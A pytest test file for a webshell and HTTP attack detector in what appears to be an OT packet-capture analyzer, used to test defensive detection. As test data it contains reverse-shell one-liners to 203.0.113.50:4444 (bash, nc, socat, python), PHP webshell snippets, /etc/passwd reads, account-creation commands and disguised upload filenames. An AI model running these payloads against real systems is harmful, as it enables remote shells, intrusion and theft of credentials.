"""Behavioural tests for ot_pcap_analyzer.http_stream_analysis (WebShell / HTTP attack detection)."""
import random

import pytest

from ot_pcap_analyzer.http_stream_analysis import (
    EnhancedHTTPStreamAnalyzer,
    analyze_http_stream_enhanced,
    get_webshell_report,
)

ATTACKER = "192.168.10.66"
BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"


def _types(threats):
    return [t["type"] for t in threats]


def _multipart(filename, content, boundary=BOUNDARY, preamble=""):
    head = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
            f"filename=\"{filename}\"\r\nContent-Type: application/octet-stream\r\n\r\n")
    if isinstance(content, bytes):
        return preamble.encode() + head.encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return preamble + head + content + f"\r\n--{boundary}--\r\n"


def _upload(filename, content, ts=1.0, src=ATTACKER, boundary_in_body=False):
    pre = f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n\r\n" if boundary_in_body else ""
    return {
        "src_ip": src, "method": "POST", "uri": "/upload.php", "timestamp": ts,
        "content_type": f"multipart/form-data; boundary={BOUNDARY}",
        "body": _multipart(filename, content, preamble=pre),
    }


@pytest.fixture
def an():
    return EnhancedHTTPStreamAnalyzer()


# --------------------------------------------------------------------------- benign

class TestBenign:
    @pytest.mark.parametrize("req", [
        {"method": "GET", "uri": "/index.html"},
        {"method": "GET", "uri": "/hmi/trend?tag=PUMP_01&range=1h"},
        {"method": "POST", "uri": "/login", "body": "user=operator&password=secret",
         "content_type": "application/x-www-form-urlencoded"},
        {"method": "POST", "uri": "/api/setpoint", "body": '{"tag": "TIC101", "value": 72.5}',
         "content_type": "application/json"},
    ])
    def test_normal_requests_raise_nothing(self, an, req):
        assert an.analyze_http_request({"src_ip": "192.168.10.10", "timestamp": 1.0, **req}) == []

    def test_benign_image_upload(self, an):
        assert an.analyze_http_request(_upload("plant_photo.png", "\x89PNG\r\n")) == []
        assert an.ip_uploaded_files == {}

    def test_upload_without_filename_or_body(self, an):
        req = _upload("x.php", "<?php ?>")
        req["body"] = req["body"].replace("filename=", "nofile=")
        assert an.analyze_http_request(req) == []
        req["body"] = ""
        assert an.analyze_http_request(req) == []

    def test_empty_request(self, an):
        assert an.analyze_http_request({}) == []
        assert an.get_attack_summary("")["total_requests"] == 1

    # Regression test: DANGEROUS_EXTENSIONS regexes are not anchored to the end of the filename, so '.sh' matches 'q3.shared.xlsx'
    def test_benign_filename_containing_extension_substring(self, an):
        assert an.analyze_http_request(_upload("q3.shared.xlsx", "PK\x03\x04")) == []

    # Regression test: bare 'hostname' COMMAND_PATTERN flags ordinary query parameters such as ?hostname=plc1 as command execution
    def test_hostname_query_parameter_is_not_a_command(self, an):
        assert an.analyze_http_request(
            {"src_ip": "192.168.10.10", "method": "GET", "uri": "/api/device?hostname=plc1"}) == []


# --------------------------------------------------------------------------- webshells

class TestWebshell:
    @pytest.mark.parametrize("uri", ["/uploads/c99.php", "/wp-content/WSO.PHP?x=1", "/tmp/b374k.php"])
    def test_known_webshell_filename(self, an, uri):
        [t] = an.analyze_http_request({"src_ip": ATTACKER, "method": "GET", "uri": uri})
        assert t["type"] == "WEBSHELL_ACCESS" and t["severity"] == "CRITICAL"
        assert t["evidence"]["matched_type"] == "known_filename"
        assert "T1505.003" in t["mitre"]

    def test_php_execution_body_needs_three_functions(self, an):
        two = "<?php system($a); exec($b); ?>"
        assert "WEBSHELL_EXECUTION_PHP" not in _types(
            an.analyze_http_request({"src_ip": "a", "method": "POST", "uri": "/x", "body": two}))
        three = "<?php system($a); exec($b); passthru($c); ?>"
        threats = an.analyze_http_request({"src_ip": "b", "method": "POST", "uri": "/x",
                                           "body": three.encode()})
        [t] = [t for t in threats if t["type"] == "WEBSHELL_EXECUTION_PHP"]
        assert t["severity"] == "CRITICAL"
        assert len(t["evidence"]["patterns_found"]) == 3

    def test_obfuscated_eval_base64_chain(self, an):
        body = "<?php @eval(base64_decode($_POST['z0'])); @eval(gzinflate(str_rot13($x))); ?>"
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": "/a.php",
                                           "body": body})
        [obf] = [t for t in threats if t["type"] == "OBFUSCATED_PAYLOAD_HTTP"]
        methods = obf["evidence"]["obfuscation_methods"]
        assert "eval(base64_decode) chain" in methods and "eval(gzinflate) chain" in methods
        assert obf["severity"] == "HIGH" and obf["evidence"]["entropy"] < 7.0

    def test_high_entropy_binary_body(self, an):
        rnd = random.Random(1234)
        blob = bytes(rnd.randrange(256) for _ in range(4096))
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": "/b",
                                           "body": blob})
        assert _types(threats) == ["OBFUSCATED_PAYLOAD_HTTP"]
        assert threats[0]["evidence"]["entropy"] > 7.0
        assert threats[0]["evidence"]["body_size"] == 4096

    def test_jsp_like_text_has_low_entropy_no_obfuscation(self, an):
        body = "base64_decode(" + "A" * 50
        assert an.analyze_http_request({"src_ip": "x", "method": "POST", "uri": "/", "body": body}) == []


# --------------------------------------------------------------------------- uploads

class TestUploads:
    def test_php_upload_without_content_analysis_is_suspicious(self, an):
        [t] = an.analyze_http_request(_upload("shell2.phtml", "hello"))
        assert t["type"] == "FILE_UPLOAD_SUSPICIOUS" and t["severity"] == "HIGH"
        assert t["evidence"]["filename"] == "shell2.phtml"
        assert an.ip_uploaded_files[ATTACKER] == ["shell2.phtml"]

    def test_uploads_only_checked_for_post(self, an):
        req = _upload("evil.php", "<?php ?>")
        req["method"] = "PUT"
        assert "FILE_UPLOAD_SUSPICIOUS" not in _types(an.analyze_http_request(req))

    @pytest.mark.parametrize("filename,content,file_type,pattern_prefix", [
        ("avatar.jpg.php", "<?php echo 1; ?>", "PHP", "double_extension:"),
        ("shell.php%00.jpg", "<?php echo 1; ?>", "PHP", "null_byte:"),
        ("update.exe", b"MZ\x90\x00\x03", "PE", "\\.exe"),
        ("agent.sh", b"\x7fELF\x02\x01\x01", "ELF", "\\.sh"),
        ("cmd.jsp", '<%@ page import="java.io.*" %>', "JSP", "\\.jsp"),
    ])
    def test_dangerous_upload_magic_bytes(self, an, filename, content, file_type, pattern_prefix):
        threats = an.analyze_http_request(_upload(filename, content, boundary_in_body=True))
        [t] = [t for t in threats if t["type"].startswith("FILE_UPLOAD")]
        assert t["type"] == "FILE_UPLOAD_DANGEROUS" and t["severity"] == "CRITICAL"
        assert t["evidence"]["file_type"] == file_type
        assert t["evidence"]["extension_pattern"].startswith(pattern_prefix)
        assert an.ip_uploaded_files[ATTACKER] == [filename]

    # Regression test: _detect_file_upload looks for 'boundary=' in the body instead of the Content-Type header, so magic-byte analysis never runs for a normal multipart req
    def test_dangerous_upload_with_boundary_only_in_header(self, an):
        threats = an.analyze_http_request(_upload("shell.php", "<?php system($_GET['c']); ?>"))
        assert "FILE_UPLOAD_DANGEROUS" in _types(threats)


# --------------------------------------------------------------------------- commands & reverse shells

class TestCommandsAndReverseShell:
    @pytest.mark.parametrize("uri,body,severity", [
        ("/x.php?c=cat /etc/passwd", "", "CRITICAL"),
        ("/x.aspx", "cmd=powershell -enc SQBFAFgA", "CRITICAL"),
        ("/x.aspx", "cmd=net user hacker P@ss /add", "CRITICAL"),
        ("/x.php?c=whoami", "", "MEDIUM"),
        ("/x.php?c=uname -a", "", "MEDIUM"),
    ])
    def test_command_execution_severity(self, an, uri, body, severity):
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": uri, "body": body})
        [t] = [t for t in threats if t["type"] == "COMMAND_EXECUTION_HTTP"]
        assert t["severity"] == severity
        assert t["evidence"]["commands"]
        assert an.ip_commands_executed[ATTACKER] == t["evidence"]["commands"]

    @pytest.mark.parametrize("body,c2", [
        ("c=bash -i >& /dev/tcp/203.0.113.50/4444 0>&1", "unknown"),
        ("c=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.50 4444 >/tmp/f", "unknown"),
        ("c=socat exec:'bash -li',pty tcp:203.0.113.50:4444", "203.0.113.50:4444"),
        ("c=python -c 'import socket;s=socket.socket();s.connect((\"203.0.113.50\",4444))'", "unknown"),
    ])
    def test_reverse_shell(self, an, body, c2):
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": "/x.php",
                                           "body": body})
        [t] = [t for t in threats if t["type"] == "REVERSE_SHELL_HTTP"]
        assert t["severity"] == "CRITICAL" and t["confidence"] == 0.95
        assert t["evidence"]["c2_target"] == c2
        assert t["evidence"]["patterns"]

    def test_reverse_shell_bytes_body(self, an):
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": "/x",
                                           "body": b"nc -e /bin/sh 203.0.113.50 4444"})
        assert "REVERSE_SHELL_HTTP" in _types(threats)

    # Regression test: _detect_command_execution ignores bytes bodies (search_text only appends str bodies)
    def test_command_in_bytes_body(self, an):
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "POST", "uri": "/x.php",
                                           "body": b"cmd=cat /etc/passwd"})
        assert "COMMAND_EXECUTION_HTTP" in _types(threats)

    # Regression test: URIs are matched without percent-decoding, so a real request like ?cmd=cat%20/etc/passwd is never detected
    def test_url_encoded_command_in_uri(self, an):
        threats = an.analyze_http_request({"src_ip": ATTACKER, "method": "GET",
                                           "uri": "/uploads/x.php?cmd=cat%20%2Fetc%2Fpasswd"})
        assert "COMMAND_EXECUTION_HTTP" in _types(threats)


# --------------------------------------------------------------------------- behaviour & chains

class TestBehaviourAndChain:
    def test_rapid_requests_after_five(self, an):
        results = [an.analyze_http_request({"src_ip": "10.0.0.7", "method": "GET", "uri": "/poll",
                                            "timestamp": 100 + i * 0.05}) for i in range(6)]
        assert all(r == [] for r in results[:4])
        assert _types(results[4]) == ["RAPID_HTTP_REQUESTS"]
        assert results[5][0]["evidence"]["unique_uris"] == 1
        assert results[5][0]["evidence"]["request_rate"] > 5.0

    @pytest.mark.parametrize("step,uris", [(1.0, ["/a"]), (0.01, ["/a", "/b", "/c"]), (0.0, ["/a"])])
    def test_no_rapid_alert(self, an, step, uris):
        for i in range(8):
            r = an.analyze_http_request({"src_ip": "10.0.0.8", "method": "GET",
                                         "uri": uris[i % len(uris)], "timestamp": 50 + i * step})
            assert r == []

    def test_full_attack_chain_and_report(self, an):
        threats, inst = analyze_http_stream_enhanced(
            _upload("shell.php", "<?php system($_GET['c']); ?>", ts=1767225600.0))
        # PHP content behind a multipart boundary is recognised by its magic bytes
        assert _types(threats) == ["FILE_UPLOAD_DANGEROUS"]
        threats, same = analyze_http_stream_enhanced(
            {"src_ip": ATTACKER, "method": "GET", "uri": "/uploads/shell.php", "timestamp": 1767225601.0},
            inst)
        assert same is inst and _types(threats) == ["WEBSHELL_ACCESS"]
        threats, _ = analyze_http_stream_enhanced(
            {"src_ip": ATTACKER, "method": "GET", "uri": "/uploads/x.php?c=cat /etc/passwd",
             "timestamp": 1767225602.0}, inst)
        assert _types(threats) == ["COMMAND_EXECUTION_HTTP", "ATTACK_CHAIN_WEBSHELL"]
        chain = threats[-1]
        assert chain["evidence"]["uploaded_files"] == ["shell.php"]
        assert chain["evidence"]["commands_executed"] == ["cat /etc/passwd"]
        assert chain["evidence"]["timeline"][0] == "1767225600: FILE_UPLOAD_DANGEROUS"

        summary = inst.get_attack_summary(ATTACKER)
        assert summary["threat_level"] == "CRITICAL" and summary["total_requests"] == 3
        report = get_webshell_report(inst, ATTACKER)
        assert "Threat Level: CRITICAL" in report
        assert "    - shell.php" in report and "    - cat /etc/passwd" in report

        # Benign client shows up in the global report only if HIGH/CRITICAL
        inst.analyze_http_request({"src_ip": "192.168.10.10", "method": "GET", "uri": "/"})
        overall = get_webshell_report(inst)
        assert f"  {ATTACKER}: CRITICAL" in overall
        assert "192.168.10.10" not in overall
        assert "Uploads: 1, Commands: 1" in overall

    def test_chain_needs_all_three_stages(self, an):
        for i in range(4):
            r = an.analyze_http_request({"src_ip": ATTACKER, "method": "GET",
                                         "uri": f"/c99.php?c=whoami&i={i}", "timestamp": i})
            assert "ATTACK_CHAIN_WEBSHELL" not in _types(r)  # no upload stage

    def test_new_analyzer_created_when_none(self):
        threats, inst = analyze_http_stream_enhanced({"src_ip": "1.1.1.1", "method": "GET", "uri": "/"})
        assert threats == [] and isinstance(inst, EnhancedHTTPStreamAnalyzer)


class TestThreatLevel:
    def test_levels(self, an):
        assert an._calculate_threat_level("nobody") == "LOW"
        an.ip_commands_executed["h"] = ["whoami"]
        assert an._calculate_threat_level("h") == "HIGH"
        an.ip_uploaded_files["u"] = ["a.php"]
        assert an._calculate_threat_level("u") == "HIGH"
        an.ip_commands_executed["c"] = ["id;"] * 6
        assert an._calculate_threat_level("c") == "CRITICAL"
        an.attack_sequences["m"] = [{"type": "X"}] * 11
        assert an._calculate_threat_level("m") == "MEDIUM"

    def test_report_for_quiet_ip(self, an):
        an.analyze_http_request({"src_ip": "10.1.1.1", "method": "GET", "uri": "/"})
        r = get_webshell_report(an, "10.1.1.1")
        assert "Threat Level: LOW" in r and "Uploaded Files: 0" in r and "Commands:" not in r
        assert "10.1.1.1" not in get_webshell_report(an)
